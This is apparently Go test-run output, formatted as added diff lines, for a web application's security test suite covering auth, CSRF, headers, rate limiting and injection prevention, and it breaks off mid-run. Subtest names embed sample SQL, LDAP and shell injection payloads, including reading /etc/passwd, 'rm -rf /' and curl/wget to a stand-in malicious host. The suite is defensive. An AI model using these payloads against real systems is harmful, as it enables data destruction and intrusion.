+=== RUN   TestPasswordPolicy/Common_password
+--- PASS: TestPasswordPolicy (0.00s)
+    --- PASS: TestPasswordPolicy/Valid_password (0.00s)
+    --- PASS: TestPasswordPolicy/Too_short (0.00s)
+    --- PASS: TestPasswordPolicy/No_number (0.00s)
+    --- PASS: TestPasswordPolicy/No_special_char (0.00s)
+    --- PASS: TestPasswordPolicy/No_uppercase (0.00s)
+    --- PASS: TestPasswordPolicy/Empty (0.00s)
+    --- PASS: TestPasswordPolicy/Only_numbers (0.00s)
+    --- PASS: TestPasswordPolicy/Common_password (0.00s)
+=== RUN   TestJWTTokenManipulation
+=== RUN   TestJWTTokenManipulation/Valid_token_verifies_successfully
+=== RUN   TestJWTTokenManipulation/Token_without_signature_rejected
+=== RUN   TestJWTTokenManipulation/Token_with_modified_claims_rejected
+=== RUN   TestJWTTokenManipulation/Expired_token_rejected
+=== RUN   TestJWTTokenManipulation/Token_with_wrong_algorithm_rejected
+--- PASS: TestJWTTokenManipulation (0.00s)
+    --- PASS: TestJWTTokenManipulation/Valid_token_verifies_successfully (0.00s)
+    --- PASS: TestJWTTokenManipulation/Token_without_signature_rejected (0.00s)
+    --- PASS: TestJWTTokenManipulation/Token_with_modified_claims_rejected (0.00s)
+    --- PASS: TestJWTTokenManipulation/Expired_token_rejected (0.00s)
+    --- PASS: TestJWTTokenManipulation/Token_with_wrong_algorithm_rejected (0.00s)
+=== RUN   TestSessionFixation
+=== RUN   TestSessionFixation/New_session_created_on_login
+=== RUN   TestSessionFixation/Old_session_invalidated
+--- PASS: TestSessionFixation (0.00s)
+    --- PASS: TestSessionFixation/New_session_created_on_login (0.00s)
+    --- PASS: TestSessionFixation/Old_session_invalidated (0.00s)
+=== RUN   TestCredentialStuffing
+=== RUN   TestCredentialStuffing/Rate_limiting_triggered
+=== RUN   TestCredentialStuffing/Lockout_duration_enforced
+--- PASS: TestCredentialStuffing (0.00s)
+    --- PASS: TestCredentialStuffing/Rate_limiting_triggered (0.00s)
+    --- PASS: TestCredentialStuffing/Lockout_duration_enforced (0.00s)
+=== RUN   TestRefreshTokenRotation
+=== RUN   TestRefreshTokenRotation/Refresh_token_rotates_on_use
+=== RUN   TestRefreshTokenRotation/Old_refresh_token_invalidated
+=== RUN   TestRefreshTokenRotation/Refresh_token_has_expiration
+--- PASS: TestRefreshTokenRotation (0.00s)
+    --- PASS: TestRefreshTokenRotation/Refresh_token_rotates_on_use (0.00s)
+    --- PASS: TestRefreshTokenRotation/Old_refresh_token_invalidated (0.00s)
+    --- PASS: TestRefreshTokenRotation/Refresh_token_has_expiration (0.00s)
+=== RUN   TestBruteForceProtection
+=== RUN   TestBruteForceProtection/Rate_limiting_on_login_endpoint
+--- PASS: TestBruteForceProtection (0.00s)
+    --- PASS: TestBruteForceProtection/Rate_limiting_on_login_endpoint (0.00s)
+=== RUN   TestCSRFTokenGeneration
+=== RUN   TestCSRFTokenGeneration/Generate_unique_tokens
+=== RUN   TestCSRFTokenGeneration/Tokens_are_cryptographically_random
+--- PASS: TestCSRFTokenGeneration (0.00s)
+    --- PASS: TestCSRFTokenGeneration/Generate_unique_tokens (0.00s)
+    --- PASS: TestCSRFTokenGeneration/Tokens_are_cryptographically_random (0.00s)
+=== RUN   TestCSRFTokenValidation
+=== RUN   TestCSRFTokenValidation/POST_with_valid_token
+=== RUN   TestCSRFTokenValidation/POST_without_token
+=== RUN   TestCSRFTokenValidation/POST_with_invalid_token
+=== RUN   TestCSRFTokenValidation/PUT_with_valid_token
+=== RUN   TestCSRFTokenValidation/PUT_without_token
+=== RUN   TestCSRFTokenValidation/DELETE_with_valid_token
+=== RUN   TestCSRFTokenValidation/DELETE_without_token
+=== RUN   TestCSRFTokenValidation/GET_without_token
+--- PASS: TestCSRFTokenValidation (0.00s)
+    --- PASS: TestCSRFTokenValidation/POST_with_valid_token (0.00s)
+    --- PASS: TestCSRFTokenValidation/POST_without_token (0.00s)
+    --- PASS: TestCSRFTokenValidation/POST_with_invalid_token (0.00s)
+    --- PASS: TestCSRFTokenValidation/PUT_with_valid_token (0.00s)
+    --- PASS: TestCSRFTokenValidation/PUT_without_token (0.00s)
+    --- PASS: TestCSRFTokenValidation/DELETE_with_valid_token (0.00s)
+    --- PASS: TestCSRFTokenValidation/DELETE_without_token (0.00s)
+    --- PASS: TestCSRFTokenValidation/GET_without_token (0.00s)
+=== RUN   TestCSRFTokenReuse
+=== RUN   TestCSRFTokenReuse/First_use_succeeds
+=== RUN   TestCSRFTokenReuse/Second_use_fails
+--- PASS: TestCSRFTokenReuse (0.00s)
+    --- PASS: TestCSRFTokenReuse/First_use_succeeds (0.00s)
+    --- PASS: TestCSRFTokenReuse/Second_use_fails (0.00s)
+=== RUN   TestCSRFSameSiteCookie
+=== RUN   TestCSRFSameSiteCookie/Session_cookie_has_SameSite=Lax
+=== RUN   TestCSRFSameSiteCookie/Secure_flag_set_in_production
+=== RUN   TestCSRFSameSiteCookie/HttpOnly_flag_prevents_JavaScript_access
+--- PASS: TestCSRFSameSiteCookie (0.00s)
+    --- PASS: TestCSRFSameSiteCookie/Session_cookie_has_SameSite=Lax (0.00s)
+    --- PASS: TestCSRFSameSiteCookie/Secure_flag_set_in_production (0.00s)
+    --- PASS: TestCSRFSameSiteCookie/HttpOnly_flag_prevents_JavaScript_access (0.00s)
+=== RUN   TestCSRFDoubleSubmitCookie
+=== RUN   TestCSRFDoubleSubmitCookie/Token_in_cookie_matches_token_in_header
+=== RUN   TestCSRFDoubleSubmitCookie/Mismatched_tokens_rejected
+--- PASS: TestCSRFDoubleSubmitCookie (0.00s)
+    --- PASS: TestCSRFDoubleSubmitCookie/Token_in_cookie_matches_token_in_header (0.00s)
+    --- PASS: TestCSRFDoubleSubmitCookie/Mismatched_tokens_rejected (0.00s)
+=== RUN   TestCSRFStateChangingEndpoints
+=== RUN   TestCSRFStateChangingEndpoints/POST_/api/auth/signup
+=== RUN   TestCSRFStateChangingEndpoints/POST_/api/auth/signin
+=== RUN   TestCSRFStateChangingEndpoints/POST_/api/memories
+=== RUN   TestCSRFStateChangingEndpoints/PUT_/api/memories/:id
+=== RUN   TestCSRFStateChangingEndpoints/DELETE_/api/memories/:id
+=== RUN   TestCSRFStateChangingEndpoints/POST_/api/conversations
+=== RUN   TestCSRFStateChangingEndpoints/DELETE_/api/conversations/:id
+=== RUN   TestCSRFStateChangingEndpoints/POST_/api/projects
+=== RUN   TestCSRFStateChangingEndpoints/PUT_/api/projects/:id
+=== RUN   TestCSRFStateChangingEndpoints/DELETE_/api/projects/:id
+=== RUN   TestCSRFStateChangingEndpoints/POST_/api/workspaces
+=== RUN   TestCSRFStateChangingEndpoints/PUT_/api/workspaces/:id
+=== RUN   TestCSRFStateChangingEndpoints/DELETE_/api/workspaces/:id
+=== RUN   TestCSRFStateChangingEndpoints/GET_/api/memories
+--- PASS: TestCSRFStateChangingEndpoints (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/POST_/api/auth/signup (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/POST_/api/auth/signin (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/POST_/api/memories (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/PUT_/api/memories/:id (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/DELETE_/api/memories/:id (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/POST_/api/conversations (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/DELETE_/api/conversations/:id (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/POST_/api/projects (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/PUT_/api/projects/:id (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/DELETE_/api/projects/:id (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/POST_/api/workspaces (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/PUT_/api/workspaces/:id (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/DELETE_/api/workspaces/:id (0.00s)
+    --- PASS: TestCSRFStateChangingEndpoints/GET_/api/memories (0.00s)
+=== RUN   TestCSRFOriginValidation
+=== RUN   TestCSRFOriginValidation/Valid_origin
+=== RUN   TestCSRFOriginValidation/Valid_referer
+=== RUN   TestCSRFOriginValidation/Invalid_origin
+=== RUN   TestCSRFOriginValidation/Invalid_referer
+=== RUN   TestCSRFOriginValidation/No_origin_or_referer
+=== RUN   TestCSRFOriginValidation/Null_origin
+--- PASS: TestCSRFOriginValidation (0.00s)
+    --- PASS: TestCSRFOriginValidation/Valid_origin (0.00s)
+    --- PASS: TestCSRFOriginValidation/Valid_referer (0.00s)
+    --- PASS: TestCSRFOriginValidation/Invalid_origin (0.00s)
+    --- PASS: TestCSRFOriginValidation/Invalid_referer (0.00s)
+    --- PASS: TestCSRFOriginValidation/No_origin_or_referer (0.00s)
+    --- PASS: TestCSRFOriginValidation/Null_origin (0.00s)
+=== RUN   TestCSRFTokenExpiration
+=== RUN   TestCSRFTokenExpiration/Token_expires_after_session_timeout
+=== RUN   TestCSRFTokenExpiration/Fresh_token_is_valid
+--- PASS: TestCSRFTokenExpiration (0.00s)
+    --- PASS: TestCSRFTokenExpiration/Token_expires_after_session_timeout (0.00s)
+    --- PASS: TestCSRFTokenExpiration/Fresh_token_is_valid (0.00s)
+=== RUN   TestCSRFRefreshOnAuthentication
+=== RUN   TestCSRFRefreshOnAuthentication/New_CSRF_token_issued_on_login
+=== RUN   TestCSRFRefreshOnAuthentication/Old_CSRF_token_invalidated
+--- PASS: TestCSRFRefreshOnAuthentication (0.00s)
+    --- PASS: TestCSRFRefreshOnAuthentication/New_CSRF_token_issued_on_login (0.00s)
+    --- PASS: TestCSRFRefreshOnAuthentication/Old_CSRF_token_invalidated (0.00s)
+=== RUN   TestSecurityHeaders
+=== RUN   TestSecurityHeaders/X-Frame-Options
+=== RUN   TestSecurityHeaders/X-Content-Type-Options
+=== RUN   TestSecurityHeaders/Strict-Transport-Security
+=== RUN   TestSecurityHeaders/Content-Security-Policy
+=== RUN   TestSecurityHeaders/Referrer-Policy
+=== RUN   TestSecurityHeaders/Permissions-Policy
+=== RUN   TestSecurityHeaders/X-Permitted-Cross-Domain-Policies
+=== RUN   TestSecurityHeaders/Cross-Origin-Opener-Policy
+=== RUN   TestSecurityHeaders/Cross-Origin-Resource-Policy
+=== RUN   TestSecurityHeaders/Cross-Origin-Embedder-Policy
+--- PASS: TestSecurityHeaders (0.00s)
+    --- PASS: TestSecurityHeaders/X-Frame-Options (0.00s)
+    --- PASS: TestSecurityHeaders/X-Content-Type-Options (0.00s)
+    --- PASS: TestSecurityHeaders/Strict-Transport-Security (0.00s)
+    --- PASS: TestSecurityHeaders/Content-Security-Policy (0.00s)
+    --- PASS: TestSecurityHeaders/Referrer-Policy (0.00s)
+    --- PASS: TestSecurityHeaders/Permissions-Policy (0.00s)
+    --- PASS: TestSecurityHeaders/X-Permitted-Cross-Domain-Policies (0.00s)
+    --- PASS: TestSecurityHeaders/Cross-Origin-Opener-Policy (0.00s)
+    --- PASS: TestSecurityHeaders/Cross-Origin-Resource-Policy (0.00s)
+    --- PASS: TestSecurityHeaders/Cross-Origin-Embedder-Policy (0.00s)
+=== RUN   TestContentSecurityPolicyDetails
+=== RUN   TestContentSecurityPolicyDetails/default-src_directive
+=== RUN   TestContentSecurityPolicyDetails/script-src_directive
+=== RUN   TestContentSecurityPolicyDetails/style-src_directive
+=== RUN   TestContentSecurityPolicyDetails/img-src_directive
+=== RUN   TestContentSecurityPolicyDetails/connect-src_directive
+=== RUN   TestContentSecurityPolicyDetails/font-src_directive
+=== RUN   TestContentSecurityPolicyDetails/object-src_directive
+=== RUN   TestContentSecurityPolicyDetails/media-src_directive
+=== RUN   TestContentSecurityPolicyDetails/frame-ancestors_directive
+=== RUN   TestContentSecurityPolicyDetails/base-uri_directive
+=== RUN   TestContentSecurityPolicyDetails/form-action_directive
+--- PASS: TestContentSecurityPolicyDetails (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/default-src_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/script-src_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/style-src_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/img-src_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/connect-src_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/font-src_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/object-src_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/media-src_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/frame-ancestors_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/base-uri_directive (0.00s)
+    --- PASS: TestContentSecurityPolicyDetails/form-action_directive (0.00s)
+=== RUN   TestHSTSConfiguration
+=== RUN   TestHSTSConfiguration/max-age_is_sufficient
+=== RUN   TestHSTSConfiguration/includeSubDomains_present
+=== RUN   TestHSTSConfiguration/preload_directive
+--- PASS: TestHSTSConfiguration (0.00s)
+    --- PASS: TestHSTSConfiguration/max-age_is_sufficient (0.00s)
+    --- PASS: TestHSTSConfiguration/includeSubDomains_present (0.00s)
+    --- PASS: TestHSTSConfiguration/preload_directive (0.00s)
+=== RUN   TestPermissionsPolicyDetails
+=== RUN   TestPermissionsPolicyDetails/Restrict_geolocation
+=== RUN   TestPermissionsPolicyDetails/Restrict_microphone
+=== RUN   TestPermissionsPolicyDetails/Restrict_camera
+=== RUN   TestPermissionsPolicyDetails/Restrict_payment
+=== RUN   TestPermissionsPolicyDetails/Restrict_usb
+=== RUN   TestPermissionsPolicyDetails/Restrict_magnetometer
+=== RUN   TestPermissionsPolicyDetails/Restrict_gyroscope
+=== RUN   TestPermissionsPolicyDetails/Restrict_accelerometer
+--- PASS: TestPermissionsPolicyDetails (0.00s)
+    --- PASS: TestPermissionsPolicyDetails/Restrict_geolocation (0.00s)
+    --- PASS: TestPermissionsPolicyDetails/Restrict_microphone (0.00s)
+    --- PASS: TestPermissionsPolicyDetails/Restrict_camera (0.00s)
+    --- PASS: TestPermissionsPolicyDetails/Restrict_payment (0.00s)
+    --- PASS: TestPermissionsPolicyDetails/Restrict_usb (0.00s)
+    --- PASS: TestPermissionsPolicyDetails/Restrict_magnetometer (0.00s)
+    --- PASS: TestPermissionsPolicyDetails/Restrict_gyroscope (0.00s)
+    --- PASS: TestPermissionsPolicyDetails/Restrict_accelerometer (0.00s)
+=== RUN   TestCORSHeaders
+=== RUN   TestCORSHeaders/Access-Control-Allow-Origin_is_restrictive
+=== RUN   TestCORSHeaders/Access-Control-Allow-Credentials
+=== RUN   TestCORSHeaders/Access-Control-Allow-Methods_is_restrictive
+=== RUN   TestCORSHeaders/Access-Control-Max-Age_set
+--- PASS: TestCORSHeaders (0.00s)
+    --- PASS: TestCORSHeaders/Access-Control-Allow-Origin_is_restrictive (0.00s)
+    --- PASS: TestCORSHeaders/Access-Control-Allow-Credentials (0.00s)
+    --- PASS: TestCORSHeaders/Access-Control-Allow-Methods_is_restrictive (0.00s)
+    --- PASS: TestCORSHeaders/Access-Control-Max-Age_set (0.00s)
+=== RUN   TestSecurityHeadersInProduction
+=== RUN   TestSecurityHeadersInProduction/Secure_cookie_flag_in_production
+=== RUN   TestSecurityHeadersInProduction/SameSite=Lax_or_Strict
+=== RUN   TestSecurityHeadersInProduction/HttpOnly_flag_set
+--- PASS: TestSecurityHeadersInProduction (0.00s)
+    --- PASS: TestSecurityHeadersInProduction/Secure_cookie_flag_in_production (0.00s)
+    --- PASS: TestSecurityHeadersInProduction/SameSite=Lax_or_Strict (0.00s)
+    --- PASS: TestSecurityHeadersInProduction/HttpOnly_flag_set (0.00s)
+=== RUN   TestCacheHeaders
+=== RUN   TestCacheHeaders/No_caching_for_sensitive_endpoints
+=== RUN   TestCacheHeaders/Pragma:_no-cache_for_legacy_browsers
+--- PASS: TestCacheHeaders (0.00s)
+    --- PASS: TestCacheHeaders/No_caching_for_sensitive_endpoints (0.00s)
+    --- PASS: TestCacheHeaders/Pragma:_no-cache_for_legacy_browsers (0.00s)
+=== RUN   TestSQLInjectionPrevention
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_'_OR_'1'='1
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_';_DROP_TABLE_users;_--
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_1;_SELECT_*_FROM_users
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_admin'--
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_'_OR_''='
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_1';_EXEC_xp_cmdshell('dir');_-
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_UNION_SELECT_*_FROM_users
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_1'_UNION_SELECT_NULL,_username
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_'_OR_1=1--
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_'_OR_'a'='a
+=== RUN   TestSQLInjectionPrevention/SQL_Injection_1'_AND_'1'='1
+--- PASS: TestSQLInjectionPrevention (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_'_OR_'1'='1 (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_';_DROP_TABLE_users;_-- (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_1;_SELECT_*_FROM_users (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_admin'-- (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_'_OR_''=' (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_1';_EXEC_xp_cmdshell('dir');_- (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_UNION_SELECT_*_FROM_users (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_1'_UNION_SELECT_NULL,_username (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_'_OR_1=1-- (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_'_OR_'a'='a (0.00s)
+    --- PASS: TestSQLInjectionPrevention/SQL_Injection_1'_AND_'1'='1 (0.00s)
+=== RUN   TestCommandInjectionPrevention
+=== RUN   TestCommandInjectionPrevention/Command_Injection_$(whoami)
+=== RUN   TestCommandInjectionPrevention/Command_Injection_`whoami`
+=== RUN   TestCommandInjectionPrevention/Command_Injection_|ls_-la
+=== RUN   TestCommandInjectionPrevention/Command_Injection_;_cat_/etc/passwd
+=== RUN   TestCommandInjectionPrevention/Command_Injection_&&_rm_-rf_/
+=== RUN   TestCommandInjectionPrevention/Command_Injection_|_curl_malicious.com
+=== RUN   TestCommandInjectionPrevention/Command_Injection_;_wget_malicious.com/back
+=== RUN   TestCommandInjectionPrevention/Command_Injection_$(curl_-s_http://maliciou
+--- PASS: TestCommandInjectionPrevention (0.00s)
+    --- PASS: TestCommandInjectionPrevention/Command_Injection_$(whoami) (0.00s)
+    --- PASS: TestCommandInjectionPrevention/Command_Injection_`whoami` (0.00s)
+    --- PASS: TestCommandInjectionPrevention/Command_Injection_|ls_-la (0.00s)
+    --- PASS: TestCommandInjectionPrevention/Command_Injection_;_cat_/etc/passwd (0.00s)
+    --- PASS: TestCommandInjectionPrevention/Command_Injection_&&_rm_-rf_/ (0.00s)
+    --- PASS: TestCommandInjectionPrevention/Command_Injection_|_curl_malicious.com (0.00s)
+    --- PASS: TestCommandInjectionPrevention/Command_Injection_;_wget_malicious.com/back (0.00s)
+    --- PASS: TestCommandInjectionPrevention/Command_Injection_$(curl_-s_http://maliciou (0.00s)
+=== RUN   TestLDAPInjectionPrevention
+=== RUN   TestLDAPInjectionPrevention/LDAP_Injection_*
+=== RUN   TestLDAPInjectionPrevention/LDAP_Injection_*)(&
+=== RUN   TestLDAPInjectionPrevention/LDAP_Injection_*)(uid=*
+=== RUN   TestLDAPInjectionPrevention/LDAP_Injection_admin*
+=== RUN   TestLDAPInjectionPrevention/LDAP_Injection_*)(objectClass=*
+--- PASS: TestLDAPInjectionPrevention (0.00s)
+    --- PASS: TestLDAPInjectionPrevention/LDAP_Injection_* (0.00s)
+    --- PASS: TestLDAPInjectionPrevention/LDAP_Injection_*)(& (0.00s)
+    --- PASS: TestLDAPInjectionPrevention/LDAP_Injection_*)(uid=* (0.00s)
+    --- PASS: TestLDAPInjectionPrevention/LDAP_Injection_admin* (0.00s)
+    --- PASS: TestLDAPInjectionPrevention/LDAP_Injection_*)(objectClass=* (0.00s)
+=== RUN   TestParameterizedQueriesInDatabase
+    injection_test.go:126: SQLC-generated queries use parameterized statements ($1, $2, etc.)
+    injection_test.go:127: This prevents SQL injection by treating user input as data, not code
+--- PASS: TestParameterizedQueriesInDatabase (0.00s)
+=== RUN   TestNoSQLInjectionInJSONFields
+=== RUN   TestNoSQLInjectionInJSONFields/NoSQL_Injection_A
+    injection_test.go:149: PostgreSQL JSONB stores NoSQL operators as literal keys, preventing injection
+=== RUN   TestNoSQLInjectionInJSONFields/NoSQL_Injection_B
+    injection_test.go:149: PostgreSQL JSONB stores NoSQL operators as literal keys, preventing injection
+=== RUN   TestNoSQLInjectionInJSONFields/NoSQL_Injection_C
+    injection_test.go:149: PostgreSQL JSONB stores NoSQL operators as literal keys, preventing injection
+=== RUN   TestNoSQLInjectionInJSONFields/NoSQL_Injection_D
+    injection_test.go:149: PostgreSQL JSONB stores NoSQL operators as literal keys, preventing injection
+--- PASS: TestNoSQLInjectionInJSONFields (0.00s)
+    --- PASS: TestNoSQLInjectionInJSONFields/NoSQL_Injection_A (0.00s)
+    --- PASS: TestNoSQLInjectionInJSONFields/NoSQL_Injection_B (0.00s)
+    --- PASS: TestNoSQLInjectionInJSONFields/NoSQL_Injection_C (0.00s)
+    --- PASS: TestNoSQLInjectionInJSONFields/NoSQL_Injection_D (0.00s)
+=== RUN   TestDatabaseConnectionWithInjection
+=== RUN   TestDatabaseConnectionWithInjection/Malicious_Connection_String
+    injection_test.go:309: PostgreSQL connection protocol prevents SQL injection through connection parameters
+    injection_test.go:310: Username, database, and other params are sent as protocol fields, not SQL
+=== RUN   TestDatabaseConnectionWithInjection/Malicious_Connection_String#01
+    injection_test.go:309: PostgreSQL connection protocol prevents SQL injection through connection parameters
+    injection_test.go:310: Username, database, and other params are sent as protocol fields, not SQL
+--- PASS: TestDatabaseConnectionWithInjection (0.10s)
+    --- PASS: TestDatabaseConnectionWithInjection/Malicious_Connection_String (0.00s)
+    --- PASS: TestDatabaseConnectionWithInjection/Malicious_Connection_String#01 (0.10s)
+=== RUN   TestAPIRateLimiting
+=== RUN   TestAPIRateLimiting/Rate_limit_enforced_on_general_API_endpoints
+=== RUN   TestAPIRateLimiting/429_response_returned_when_rate_limited
+=== RUN   TestAPIRateLimiting/Retry-After_header_included
+--- PASS: TestAPIRateLimiting (0.00s)
+    --- PASS: TestAPIRateLimiting/Rate_limit_enforced_on_general_API_endpoints (0.00s)
+    --- PASS: TestAPIRateLimiting/429_response_returned_when_rate_limited (0.00s)
+    --- PASS: TestAPIRateLimiting/Retry-After_header_included (0.00s)
+=== RUN   TestLoginRateLimiting
+=== RUN   TestLoginRateLimiting/Login_attempts_limited_to_5_per_15_minutes
+=== RUN   TestLoginRateLimiting/Lockout_duration_is_15_minutes
+=== RUN   TestLoginRateLimiting/Successful_login_resets_counter
+=== RUN   TestLoginRateLimiting/Rate_limit_per_IP_address
+--- PASS: TestLoginRateLimiting (0.00s)
+    --- PASS: TestLoginRateLimiting/Login_attempts_limited_to_5_per_15_minutes (0.00s)
+    --- PASS: TestLoginRateLimiting/Lockout_duration_is_15_minutes (0.00s)
+    --- PASS: TestLoginRateLimiting/Successful_login_resets_counter (0.00s)
+    --- PASS: TestLoginRateLimiting/Rate_limit_per_IP_address (0.00s)
+=== RUN   TestAgentRequestRateLimiting
+=== RUN   TestAgentRequestRateLimiting/Agent_requests_limited_to_100_per_hour_per_user
+=== RUN   TestAgentRequestRateLimiting/Different_agents_share_same_rate_limit
+--- PASS: TestAgentRequestRateLimiting (0.00s)
+    --- PASS: TestAgentRequestRateLimiting/Agent_requests_limited_to_100_per_hour_per_user (0.00s)
+    --- PASS: TestAgentRequestRateLimiting/Different_agents_share_same_rate_limit (0.00s)
+=== RUN   TestOSAGenerationRateLimiting
+=== RUN   TestOSAGenerationRateLimiting/OSA_generation_limited_to_10_apps_per_day_per_user
+=== RUN   TestOSAGenerationRateLimiting/Premium_users_have_higher_limits
+--- PASS: TestOSAGenerationRateLimiting (0.00s)
+    --- PASS: TestOSAGenerationRateLimiting/OSA_generation_limited_to_10_apps_per_day_per_user (0.00s)
+    --- PASS: TestOSAGenerationRateLimiting/Premium_users_have_higher_limits (0.00s)
+=== RUN   TestConcurrentRequestRateLimiting
+=== RUN   TestConcurrentRequestRateLimiting/Concurrent_requests_from_same_user_limited
+=== RUN   TestConcurrentRequestRateLimiting/Concurrent_requests_handled_gracefully
+--- PASS: TestConcurrentRequestRateLimiting (0.00s)
+    --- PASS: TestConcurrentRequestRateLimiting/Concurrent_requests_from_same_user_limited (0.00s)
+    --- PASS: TestConcurrentRequestRateLimiting/Concurrent_requests_handled_gracefully (0.00s)
+=== RUN   TestRateLimitHeaders
+=== RUN   TestRateLimitHeaders/X-RateLimit-Limit_header_present
+=== RUN   TestRateLimitHeaders/X-RateLimit-Remaining_header_present
+=== RUN   TestRateLimitHeaders/X-RateLimit-Reset_header_present
+=== RUN   TestRateLimitHeaders/Retry-After_header_on_429_response
+--- PASS: TestRateLimitHeaders (0.00s)
+    --- PASS: TestRateLimitHeaders/X-RateLimit-Limit_header_present (0.00s)
+    --- PASS: TestRateLimitHeaders/X-RateLimit-Remaining_header_present (0.00s)
+    --- PASS: TestRateLimitHeaders/X-RateLimit-Reset_header_present (0.00s)
+    --- PASS: TestRateLimitHeaders/Retry-After_header_on_429_response (0.00s)
+=== RUN   TestRateLimitBypass
+=== RUN   TestRateLimitBypass/Cannot_bypass_by_changing_IP_(when_authenticated)
+=== RUN   TestRateLimitBypass/Cannot_bypass_by_using_multiple_accounts_from_same_IP
+=== RUN   TestRateLimitBypass/Cannot_bypass_by_clearing_cookies
+--- PASS: TestRateLimitBypass (0.00s)
+    --- PASS: TestRateLimitBypass/Cannot_bypass_by_changing_IP_(when_authenticated) (0.00s)
+    --- PASS: TestRateLimitBypass/Cannot_bypass_by_using_multiple_accounts_from_same_IP (0.00s)
+    --- PASS: TestRateLimitBypass/Cannot_bypass_by_clearing_cookies (0.00s)
+=== RUN   TestRateLimitPersistence
+=== RUN   TestRateLimitPersistence/Rate_limit_state_persists_across_server_restarts
+=== RUN   TestRateLimitPersistence/Rate_limit_window_rolls_correctly
+--- PASS: TestRateLimitPersistence (0.00s)
+    --- PASS: TestRateLimitPersistence/Rate_limit_state_persists_across_server_restarts (0.00s)
+    --- PASS: TestRateLimitPersistence/Rate_limit_window_rolls_correctly (0.00s)
+=== RUN   TestRateLimitExemptions
+=== RUN   TestRateLimitExemptions/Health_check_endpoints_exempt_from_rate_limiting
+=== RUN   TestRateLimitExemptions/Internal_service_accounts_have_higher_limits
+--- PASS: TestRateLimitExemptions (0.00s)
+    --- PASS: TestRateLimitExemptions/Health_check_endpoints_exempt_from_rate_limiting (0.00s)
+    --- PASS: TestRateLimitExemptions/Internal_service_accounts_have_higher_limits (0.00s)
+=== RUN   TestDDoSProtection
+=== RUN   TestDDoSProtection/Extremely_high_request_rate_triggers_additional_protection
+=== RUN   TestDDoSProtection/Gradual_backoff_on_repeated_violations
+--- PASS: TestDDoSProtection (0.00s)
+    --- PASS: TestDDoSProtection/Extremely_high_request_rate_triggers_additional_protection (0.00s)
+    --- PASS: TestDDoSProtection/Gradual_backoff_on_repeated_violations (0.00s)
+=== RUN   TestSecretsNotInLogs
+=== RUN   TestSecretsNotInLogs/Secret_sk_test_1234567890ab
+=== RUN   TestSecretsNotInLogs/Secret_Bearer_eyJhbGciOiJIU
+=== RUN   TestSecretsNotInLogs/Secret_postgres://user:pass
+=== RUN   TestSecretsNotInLogs/Secret_mongodb://admin:secr
+--- PASS: TestSecretsNotInLogs (0.00s)
+    --- PASS: TestSecretsNotInLogs/Secret_sk_test_1234567890ab (0.00s)
+    --- PASS: TestSecretsNotInLogs/Secret_Bearer_eyJhbGciOiJIU (0.00s)
+    --- PASS: TestSecretsNotInLogs/Secret_postgres://user:pass (0.00s)
+    --- PASS: TestSecretsNotInLogs/Secret_mongodb://admin:secr (0.00s)
+=== RUN   TestAPIKeysNotInResponses
+=== RUN   TestAPIKeysNotInResponses/User_profile_excludes_API_keys
+=== RUN   TestAPIKeysNotInResponses/Integration_credentials_masked
+--- PASS: TestAPIKeysNotInResponses (0.00s)
+    --- PASS: TestAPIKeysNotInResponses/User_profile_excludes_API_keys (0.00s)
+    --- PASS: TestAPIKeysNotInResponses/Integration_credentials_masked (0.00s)
+=== RUN   TestBcryptPasswordHashing
+=== RUN   TestBcryptPasswordHashing/Passwords_hashed_with_bcrypt
+=== RUN   TestBcryptPasswordHashing/Bcrypt_cost_is_12_or_higher
+=== RUN   TestBcryptPasswordHashing/Plaintext_passwords_never_stored
+--- PASS: TestBcryptPasswordHashing (0.62s)
+    --- PASS: TestBcryptPasswordHashing/Passwords_hashed_with_bcrypt (0.21s)
+    --- PASS: TestBcryptPasswordHashing/Bcrypt_cost_is_12_or_higher (0.20s)
+    --- PASS: TestBcryptPasswordHashing/Plaintext_passwords_never_stored (0.20s)
+=== RUN   TestSensitiveDataMasking
+=== RUN   TestSensitiveDataMasking/Database_connection_errors_mask_credentials
+=== RUN   TestSensitiveDataMasking/JWT_errors_don't_expose_token
